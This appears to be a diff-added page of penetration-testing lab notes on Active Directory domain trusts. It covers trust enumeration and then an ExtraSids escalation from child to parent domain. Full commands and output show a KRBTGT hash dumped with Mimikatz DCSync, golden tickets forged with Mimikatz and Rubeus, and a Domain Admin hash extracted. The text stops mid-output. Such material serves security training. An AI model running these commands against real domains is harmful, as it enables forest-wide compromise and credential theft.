+<li><a href="#performing-the-attack-with-raisechildpy">Performing the Attack with raiseChild.py</a></li>
+<li><a href="#performing-the-attack-with-raisechildpy-1">Performing the Attack with raiseChild.py</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h1 id="ad-domain-trust-attacks"><a class="header" href="#ad-domain-trust-attacks">AD Domain Trust Attacks</a></h1>
+<h2 id="primer"><a class="header" href="#primer">Primer</a></h2>
+<h3 id="domain-trusts-overview"><a class="header" href="#domain-trusts-overview">Domain Trusts Overview</a></h3>
+<p>A trust is used to establish forest-forest or domain-domain authentication, which allows users to access resources in another domain, outside of the main domain where their account resides. A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way communication. An organization can create various types of trusts:</p>
+<ul>
+<li><strong>Parent-Child</strong>: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain corp.inlanefreight.local could authenticate into the parent domain inlanefreight.local, and vice-versa.</li>
+<li><strong>Cross-link</strong>: A trust between child domains to speed up authentication.</li>
+<li><strong>External</strong>: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering or filters out authentication requests (<em>by SID</em>) not from the trusted domain.</li>
+<li><strong>Tree-root</strong>: A two-way transitive trust between a forest root domain and a new tree root domain. They are creted by design when you set up a new tree root domain within a forest.</li>
+<li><strong>Forest</strong>: A transitive trust between two forest root domains.</li>
+<li><strong>ESAE</strong>: A bastion forest used to manage AD.</li>
+</ul>
+<p>When establishing a trust, certain elements can be modified depending on the business case.</p>
+<p>Trusts can be transitive or non-transitive.</p>
+<ul>
+<li>A <strong>transitive</strong> trust means that trust is extended to objects that the child domain trusts. For example, say you have three domains. In a transitive relationship, if Domain A has a trust with Domain B, and Domain B has a transitive trust with Domain C, then Domain A will automatically trust Domain C.</li>
+<li>In a <strong>non-transitive</strong> trust, the child domain itself is the only one trusted.</li>
+</ul>
+<p>Trusts can be set up in two directions: one-way or two-way.</p>
+<ul>
+<li><strong>One-way trust</strong>: Users in a trusted domain can access resources in a trusting domain, not vice-versa.</li>
+<li><strong>Bidirectional trust</strong>: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between INLANEFREIGHT.LOCAL and FREIGHTLOGISTICS.LOCAL, users in INLANEFREIGHT.LOCAL would be able to access resources in FREIGHTLOGISTICS.LOCAL, and vice-versa.</li>
+</ul>
+<p>Domain trusts are often set up incorrectly and can provide you with critical unintended attack paths. Also, trusts set up for ease of use may not be reviewed later for potential security implications if security is not considered before establishing the trust relationship. A Merger &amp; Acquisition between two companies can result in bidirectional trusts with acquired companies, which can unknowingly introduce risk into the acquiring company's environment if the security posture of the acquired company is unknown und untested. If someone wanted to target your organization, they could also look at the other company you acquired for a potentially softer target to attack, allowing them to get into your organization indirectly. It is not uncommon to be able to perform an attack such as Kerberoasting against a domain outside the principal domain and obtain a user that has administrative access within the principal domain.</p>
+<h3 id="enumarating"><a class="header" href="#enumarating">Enumarating</a></h3>
+<h4 id="using-get-adtrust"><a class="header" href="#using-get-adtrust">Using Get-ADTrust</a></h4>
+<p>You can use the Get-ADTrust cmdlet to enumerate domain trust relationships. This is especially helpful if you are limited to just using built-in tools.</p>
+<pre><code class="language-powershell">PS C:\htb&gt; Import-Module activedirectory
+PS C:\htb&gt; Get-ADTrust -Filter *
+
+Direction               : BiDirectional
+DisallowTransivity      : False
+DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+ForestTransitive        : False
+IntraForest             : True
+IsTreeParent            : False
+IsTreeRoot              : False
+Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
+ObjectClass             : trustedDomain
+ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
+SelectiveAuthentication : False
+SIDFilteringForestAware : False
+SIDFilteringQuarantined : False
+Source                  : DC=INLANEFREIGHT,DC=LOCAL
+Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
+TGTDelegation           : False
+TrustAttributes         : 32
+TrustedPolicy           :
+TrustingPolicy          :
+TrustType               : Uplevel
+UplevelOnly             : False
+UsesAESKeys             : False
+UsesRC4Encryption       : False
+
+Direction               : BiDirectional
+DisallowTransivity      : False
+DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+ForestTransitive        : True
+IntraForest             : False
+IsTreeParent            : False
+IsTreeRoot              : False
+Name                    : FREIGHTLOGISTICS.LOCAL
+ObjectClass             : trustedDomain
+ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
+SelectiveAuthentication : False
+SIDFilteringForestAware : False
+SIDFilteringQuarantined : False
+Source                  : DC=INLANEFREIGHT,DC=LOCAL
+Target                  : FREIGHTLOGISTICS.LOCAL
+TGTDelegation           : False
+TrustAttributes         : 8
+TrustedPolicy           :
+TrustingPolicy          :
+TrustType               : Uplevel
+UplevelOnly             : False
+UsesAESKeys             : False
+UsesRC4Encryption       : False
+</code></pre>
+<p>The above output shows that your current domain INLANEFREIGHT.LOCAL has two domain trusts. The first is with LOGISTICS.INLANEFREIGHT.LOCAL, and the IntraForest property shows that this is a child domain, and you are currently positioned in the root domain on the forest. The second trust is with the domain FREIGHTLOGISTICS.LOCAL, and the ForestTransitive property is set to True, which means that this is a forest trust or external trust. You can see that both trusts are set up to be bidirectional, meaning that users can authenticate back and forth across both trusts. This is important to note down during an assessment. If you cannot authenticate across a trust, you cannot perform any enumeration or attacks across the trust.</p>
+<h4 id="checking-for-existing-trusts-using-get-domaintrust"><a class="header" href="#checking-for-existing-trusts-using-get-domaintrust">Checking for Existing Trusts using Get-DomainTrust</a></h4>
+<p>Aside from using built-in AD tools such as the AD PowerShell module, both PowerView and BloodHound can be utilized to enumerate trust relationships, the type of trusts established, and the authentication flow. After importing PowerView, you can use the Get-DomainTrust function to enumerate what trusts exist, if any.</p>
+<pre><code class="language-powershell">PS C:\htb&gt; Get-DomainTrust 
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 6:20:22 PM
+WhenChanged     : 2/26/2022 11:55:55 PM
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : FREIGHTLOGISTICS.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 8:07:09 PM
+WhenChanged     : 2/27/2022 12:02:39 AM
+</code></pre>
+<h4 id="using-get-domaintrustmapping"><a class="header" href="#using-get-domaintrustmapping">Using Get-DomainTrustMapping</a></h4>
+<p>PowerView can be used to perform a domain trust mapping and provide information such as the type of trust and the direction of the trust. This information is beneficial once a foothold is obtained, and you plan to compromise the environment further.</p>
+<pre><code class="language-powershell">PS C:\htb&gt; Get-DomainTrustMapping
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 6:20:22 PM
+WhenChanged     : 2/26/2022 11:55:55 PM
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : FREIGHTLOGISTICS.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 8:07:09 PM
+WhenChanged     : 2/27/2022 12:02:39 AM
+
+SourceName      : FREIGHTLOGISTICS.LOCAL
+TargetName      : INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 8:07:08 PM
+WhenChanged     : 2/27/2022 12:02:41 AM
+
+SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
+TargetName      : INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 6:20:22 PM
+WhenChanged     : 2/26/2022 11:55:55 PM
+</code></pre>
+<h4 id="checking-users-in-the-child-domain-using-get-domainuser"><a class="header" href="#checking-users-in-the-child-domain-using-get-domainuser">Checking Users in the Child Domain using Get-DomainUser</a></h4>
+<p>From here, you could begin performing enumeration across the trusts. For example, you could look at all users in the child domain:</p>
+<pre><code class="language-powershell">PS C:\htb&gt; Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
+
+samaccountname
+--------------
+htb-student_adm
+Administrator
+Guest
+lab_adm
+krbtgt
+</code></pre>
+<h4 id="using-netdom-to-query-domain-trust"><a class="header" href="#using-netdom-to-query-domain-trust">Using netdom to query Domain Trust</a></h4>
+<p>Another tool you can use to get Domain Trust is netdom. The netdom query sub-command of the netdom command-line tool in Windows can retrieve information about the domain, including a list of workstations, servers, and domain trusts.</p>
+<pre><code>C:\htb&gt; netdom query /domain:inlanefreight.local trust
+Direction Trusted\Trusting domain                         Trust type
+========= =======================                         ==========
+
+&lt;-&gt;       LOGISTICS.INLANEFREIGHT.LOCAL
+Direct
+ Not found
+
+&lt;-&gt;       FREIGHTLOGISTICS.LOCAL
+Direct
+ Not found
+
+The command completed successfully.
+</code></pre>
+<h4 id="using-netdom-to-query-dcs"><a class="header" href="#using-netdom-to-query-dcs">Using netdom to query DCs</a></h4>
+<pre><code>C:\htb&gt; netdom query /domain:inlanefreight.local dc
+List of domain controllers with accounts in the domain:
+
+ACADEMY-EA-DC01
+The command completed successfully.
+</code></pre>
+<h4 id="using-netdom-to-query-workstations-and-servers"><a class="header" href="#using-netdom-to-query-workstations-and-servers">Using netdom to query Workstations and Servers</a></h4>
+<pre><code>C:\htb&gt; netdom query /domain:inlanefreight.local workstation
+List of workstations with accounts in the domain:
+
+ACADEMY-EA-MS01
+ACADEMY-EA-MX01      ( Workstation or Server )
+
+SQL01      ( Workstation or Server )
+ILF-XRG      ( Workstation or Server )
+MAINLON      ( Workstation or Server )
+CISERVER      ( Workstation or Server )
+INDEX-DEV-LON      ( Workstation or Server )
+...SNIP...
+</code></pre>
+<h4 id="visualizing-trust-relationships-in-bloodhound"><a class="header" href="#visualizing-trust-relationships-in-bloodhound">Visualizing Trust Relationships in BloodHound</a></h4>
+<p>You can also use BloodHound to visualize these trust relationships by using the Map Domain Trusts pre-built query. Here you can easily see that two bidirectional trusts exist.</p>
+<p><img src="../../../../images/ad_trust_attacks1.png" alt="ad trust attacks 1" /></p>
+<h2 id="attacking-domain-trusts-from-windows"><a class="header" href="#attacking-domain-trusts-from-windows">Attacking Domain Trusts from Windows</a></h2>
+<h3 id="sid-history-primer"><a class="header" href="#sid-history-primer">SID History Primer</a></h3>
+<p>The sidHistory attribute is used in migration scenarios. If a user in one domain is migrated into another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.</p>
+<p>SID history is intended to work across domains, but can work in the same domain. Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging in with this account, all of the SIDs associated with the account are added to the user's token.</p>
+<p>This token is used to determine what resources the account can access. If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a Golden Ticket or a Kerberos TGT, which will allow for you to authenticate as any account in the domain of your choosing for further persistence.</p>
+<h3 id="extrasids-attack---mimikatz"><a class="header" href="#extrasids-attack---mimikatz">ExtraSids Attack - Mimikatz</a></h3>
+<p>This attack allows for the compromise of a parent domain once the child domain has been compromised. Within the same AD forest, the sidHistory property is respected due to a lack of SID Filtering protection. SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the Enterprise Admins group, they are treated as a member of this group, which allows for administrative access to the entire forest. In other words, you are creating a Golden Ticket from the compromised child domain to compromise the parent domain. In this case, you will leverage the SIDHistory to grant an account Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admin group, which will give you full access to the parent domain without actually being part of the group.</p>
+<p>To perform this attack after compromising a child domani, you need the following:</p>
+<ul>
+<li>The KRBTGT hash for the child domain</li>
+<li>The SID for the child domain</li>
+<li>The name of a target user in the child domain</li>
+<li>The FQDN of the child domain</li>
+<li>The SID of the Enterprise Admins group of the root domain</li>
+<li>With this data collected, the attack can be performed with Mimikatz</li>
+</ul>
+<p>Now you can gather each piece of data required to perform the ExtraSids attack. First, you need to obtain the NT hash for the KRBTGT account, which is a service account for the KDC in AD. The account KRBTGT is used to encrypt/sign all Kerberos tickets granted within a given domain. DCs use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in AD environments. The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account, which should be done periodically and definitely after a pentest assessment where full domain compromise is reached.</p>
+<h4 id="obtaining-the-krbtgt-accounts-nt-hash-using-mimikatz"><a class="header" href="#obtaining-the-krbtgt-accounts-nt-hash-using-mimikatz">Obtaining the KRBTGT Account's NT Hash using Mimikatz</a></h4>
+<p>Since you have compromised the child domain, you can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.</p>
+<pre><code class="language-powershell">PS C:\htb&gt;  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
+[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'LOGISTICS\krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 11/1/2021 11:21:33 AM
+Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 9d765b482771505cbe97411065964d5f
+    ntlm- 0: 9d765b482771505cbe97411065964d5f
+    lm  - 0: 69df324191d4a80f0ed100c10f20561e
+</code></pre>
+<h4 id="using-get-domainsid"><a class="header" href="#using-get-domainsid">Using Get-DomainSID</a></h4>
+<p>You can use the PowerView Get-DomainSID function to get the SID for the child domain, but this is also visible in the Mimikatz output above.</p>
+<pre><code class="language-powershell">PS C:\htb&gt; Get-DomainSID
+
+S-1-5-21-2806153819-209893948-922872689
+</code></pre>
+<h4 id="obtaining-enterprise-admins-groups-sid-using-get-domaingroup"><a class="header" href="#obtaining-enterprise-admins-groups-sid-using-get-domaingroup">Obtaining Enterprise Admins Group's SID using Get-DomainGroup</a></h4>
+<p>Next, you can use Get-DomainGroup from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. You could also do this with the Get-ADGroup cmdlet with a command such as <code>Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"</code>.</p>
+<pre><code class="language-powershell">PS C:\htb&gt; Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+
+distinguishedname                                       objectsid                                    
+-----------------                                       ---------                                    
+CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
+</code></pre>
+<h4 id="using-ls-to-confirm-no-access"><a class="header" href="#using-ls-to-confirm-no-access">Using ls to Confirm No Access</a></h4>
+<p>Before the attack, you can confirm no access to the file system of the DC in the parent domain.</p>
+<pre><code class="language-powershell">PS C:\htb&gt; ls \\academy-ea-dc01.inlanefreight.local\c$
+
+ls : Access is denied
+At line:1 char:1
++ ls \\academy-ea-dc01.inlanefreight.local\c$
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+</code></pre>
+<h4 id="creating-a-golden-ticket-with-mimikatz"><a class="header" href="#creating-a-golden-ticket-with-mimikatz">Creating a Golden Ticket with Mimikatz</a></h4>
+<p>Using Mimikatz and the data listed above, you can create a Golden Ticket to access all resources within the parent domain.</p>
+<pre><code class="language-powershell">PS C:\htb&gt; mimikatz.exe
+
+mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+User      : hacker
+Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
+SID       : S-1-5-21-2806153819-209893948-922872689
+User Id   : 500
+Groups Id : *513 512 520 518 519
+Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
+ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
+Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
+-&gt; Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
+</code></pre>
+<h4 id="confirming-a-kerberos-ticket-is-in-memory-using-klist"><a class="header" href="#confirming-a-kerberos-ticket-is-in-memory-using-klist">Confirming a Kerberos Ticket is in Memory Using klist</a></h4>
+<p>You can confirm that the Kerberos ticket for the non-existent hacker user is residing in memory.</p>
+<pre><code class="language-powershell">PS C:\htb&gt; klist
+
+Current LogonId is 0:0xf6462
+
+Cached Tickets: (1)
+
+#0&gt;     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
+        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40e00000 -&gt; forwardable renewable initial pre_authent
+        Start Time: 3/28/2022 19:59:50 (local)
+        End Time:   3/25/2032 19:59:50 (local)
+        Renew Time: 3/25/2032 19:59:50 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -&gt; PRIMARY
+        Kdc Called:
+</code></pre>
+<h4 id="listing-the-entire-c-drive-of-the-dc"><a class="header" href="#listing-the-entire-c-drive-of-the-dc">Listing the Entire C: Drive of the DC</a></h4>
+<p>From here, it is possible to access any resources within the parent domain, and you could compromise the parent domain in several ways.</p>
+<pre><code class="language-powershell">PS C:\htb&gt; ls \\academy-ea-dc01.inlanefreight.local\c$
+ Volume in drive \\academy-ea-dc01.inlanefreight.local\c$ has no label.
+ Volume Serial Number is B8B3-0D72
+
+ Directory of \\academy-ea-dc01.inlanefreight.local\c$
+
+09/15/2018  12:19 AM    &lt;DIR&gt;          PerfLogs
+10/06/2021  01:50 PM    &lt;DIR&gt;          Program Files
+09/15/2018  02:06 AM    &lt;DIR&gt;          Program Files (x86)
+11/19/2021  12:17 PM    &lt;DIR&gt;          Shares
+10/06/2021  10:31 AM    &lt;DIR&gt;          Users
+03/21/2022  12:18 PM    &lt;DIR&gt;          Windows
+               0 File(s)              0 bytes
+               6 Dir(s)  18,080,178,176 bytes free
+</code></pre>
+<h3 id="extrasids-attack---rubeus"><a class="header" href="#extrasids-attack---rubeus">ExtraSids Attack - Rubeus</a></h3>
+<p>You can also perform this attack using Rubeus.</p>
+<h4 id="using-ls-to-confirm-no-access-before-running-rubeus"><a class="header" href="#using-ls-to-confirm-no-access-before-running-rubeus">Using ls to Confirm No Access Before Running Rubeus</a></h4>
+<p>First, again you'll confirm that you cannot access the parent domain DC's file system.</p>
+<pre><code class="language-powershell">PS C:\htb&gt; ls \\academy-ea-dc01.inlanefreight.local\c$
+
+ls : Access is denied
+At line:1 char:1
++ ls \\academy-ea-dc01.inlanefreight.local\c$
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAcces 
+   sException
+    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+	
+&lt;SNIP&gt; 
+</code></pre>
+<h4 id="creating-a-golden-ticket-using-rubeus"><a class="header" href="#creating-a-golden-ticket-using-rubeus">Creating a Golden Ticket using Rubeus</a></h4>
+<p>Next, you will formulate your Rubeus command using the data you retrieved above. The <code>/rc4</code> flag is the NT hash for the KRBTGT account. The <code>/sids</code> flag will tell Rubeus to create your Golden Ticket giving you the same rights as members of the Enterprise Admins group in the parent domain.</p>
+<pre><code class="language-powershell">PS C:\htb&gt;  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2 
+
+[*] Action: Build TGT
+
+[*] Building PAC
+
+[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
+[*] SID            : S-1-5-21-2806153819-209893948-922872689
+[*] UserId         : 500
+[*] Groups         : 520,512,513,519,518
+[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
+[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
+[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
+[*] KDCKey         : 9D765B482771505CBE97411065964D5F
+[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
+[*] Service        : krbtgt
+[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL
+
+[*] Generating EncTicketPart
+[*] Signing PAC
+[*] Encrypting EncTicketPart
+[*] Generating Ticket
+[*] Generated KERB-CRED
+[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'
+
+[*] AuthTime       : 3/29/2022 10:06:41 AM
+[*] StartTime      : 3/29/2022 10:06:41 AM
+[*] EndTime        : 3/29/2022 8:06:41 PM
+[*] RenewTill      : 4/5/2022 10:06:41 AM
+
+[*] base64(ticket.kirbi):
+      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoR8bHUxPR0lTVElDUy5JTkxBTkVG
+      UkVJR0hULkxPQ0FMojIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5M
+      T0NBTKOCBDIwggQuoAMCARehAwIBA6KCBCAEggQc0u5onpWKAP0Hw0KJuEOAFp8OgfBXlkwH3sXu5BhH
+      T3zO/Ykw2Hkq2wsoODrBj0VfvxDNNpvysToaQdjHIqIqVQ9kXfNHM7bsQezS7L1KSx++2iX94uRrwa/S
+      VfgHhAuxKPlIi2phwjkxYETluKl26AUo2+WwxDXmXwGJ6LLWN1W4YGScgXAX+Kgs9xrAqJMabsAQqDfy
+      k7+0EH9SbmdQYqvAPrBqYEnt0mIPM9cakei5ZS1qfUDWjUN4mxsqINm7qNQcZHWN8kFSfAbqyD/OZIMc
+      g78hZ8IYL+Y4LPEpiQzM8JsXqUdQtiJXM3Eig6RulSxCo9rc5YUWTaHx/i3PfWqP+dNREtldE2sgIUQm
+      9f3cO1aOCt517Mmo7lICBFXUTQJvfGFtYdc01fWLoN45AtdpJro81GwihIFMcp/vmPBlqQGxAtRKzgzY
+      acuk8YYogiP6815+x4vSZEL2JOJyLXSW0OPhguYSqAIEQshOkBm2p2jahQWYvCPPDd/EFM7S3NdMnJOz
+      X3P7ObzVTAPQ/o9lSaXlopQH6L46z6PTcC/4GwaRbqVnm1RU0O3VpVr5bgaR+Nas5VYGBYIHOw3Qx5YT
+      3dtLvCxNa3cEgllr9N0BjCl1iQGWyFo72JYI9JLV0VAjnyRxFqHztiSctDExnwqWiyDaGET31PRdEz+H
+      WlAi4Y56GaDPrSZFS1RHofKqehMQD6gNrIxWPHdS9aiMAnhQth8GKbLqimcVrCUG+eghE+CN999gHNMG
+      Be1Vnz8Oc3DIM9FNLFVZiqJrAvsq2paakZnjf5HXOZ6EdqWkwiWpbGXv4qyuZ8jnUyHxavOOPDAHdVeo
+      /RIfLx12GlLzN5y7132Rj4iZlkVgAyB6+PIpjuDLDSq6UJnHRkYlJ/3l5j0KxgjdZbwoFbC7p76IPC3B
+      aY97mXatvMfrrc/Aw5JaIFSaOYQ8M/frCG738e90IK/2eTFZD9/kKXDgmwMowBEmT3IWj9lgOixNcNV/
+      OPbuqR9QiT4psvzLGmd0jxu4JSm8Usw5iBiIuW/pwcHKFgL1hCBEtUkaWH24fuJuAIdei0r9DolImqC3
+      sERVQ5VSc7u4oaAIyv7Acq+UrPMwnrkDrB6C7WBXiuoBAzPQULPTWih6LyAwenrpd0sOEOiPvh8NlvIH
+      eOhKwWOY6GVpVWEShRLDl9/XLxdnRfnNZgn2SvHOAJfYbRgRHMWAfzA+2+xps6WS/NNf1vZtUV/KRLlW
+      sL5v91jmzGiZQcENkLeozZ7kIsY/zadFqVnrnQqsd97qcLYktZ4yOYpxH43JYS2e+cXZ+NXLKxex37HQ
+      F5aNP7EITdjQds0lbyb9K/iUY27iyw7dRVLz3y5Dic4S4+cvJBSz6Y1zJHpLkDfYVQbBUCfUps8ImJij
+      Hf+jggEhMIIBHaADAgEAooIBFASCARB9ggEMMIIBCKCCAQQwggEAMIH9oBswGaADAgEXoRIEEBrCyB2T
+      JTKolmppTTXOXQShHxsdTE9HSVNUSUNTLklOTEFORUZSRUlHSFQuTE9DQUyiEzARoAMCAQGhCjAIGwZo
+      YWNrZXKjBwMFAEDgAACkERgPMjAyMjAzMjkxNzA2NDFapREYDzIwMjIwMzI5MTcwNjQxWqYRGA8yMDIy
+      MDMzMDAzMDY0MVqnERgPMjAyMjA0MDUxNzA2NDFaqB8bHUxPR0lTVElDUy5JTkxBTkVGUkVJR0hULkxP
+      Q0FMqTIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5MT0NBTA==
+
+[+] Ticket successfully imported!
+</code></pre>
+<h4 id="confirming-the-ticket-is-in-memory-using-klist"><a class="header" href="#confirming-the-ticket-is-in-memory-using-klist">Confirming the Ticket is in Memory Using klist</a></h4>
+<p>Once again, you can check that the ticket is in memory using the klist.</p>
+<pre><code class="language-powershell">PS C:\htb&gt; klist
+
+Current LogonId is 0:0xf6495
+
+Cached Tickets: (1)
+
+#0&gt;	Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
+	Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
+	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+	Ticket Flags 0x40e00000 -&gt; forwardable renewable initial pre_authent 
+	Start Time: 3/29/2022 10:06:41 (local)
+	End Time:   3/29/2022 20:06:41 (local)
+	Renew Time: 4/5/2022 10:06:41 (local)
+	Session Key Type: RSADSI RC4-HMAC(NT)
+	Cache Flags: 0x1 -&gt; PRIMARY 
+	Kdc Called: 
+</code></pre>
+<h4 id="performing-a-dcsync-attack"><a class="header" href="#performing-a-dcsync-attack">Performing a DCSync Attack</a></h4>
+<p>Finally, you can test this access by performing a DCSync attack against the parent domain, targeting the lad_adm Domain Admin user.</p>
+<pre><code class="language-powershell">PS C:\Tools\mimikatz\x64&gt; .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'INLANEFREIGHT\lab_adm' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : lab_adm
+
+** SAM ACCOUNT **
+
+SAM Username         : lab_adm
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 2/27/2022 10:53:21 PM
+Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
+Object Relative ID   : 1001
+
+Credentials:
+  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
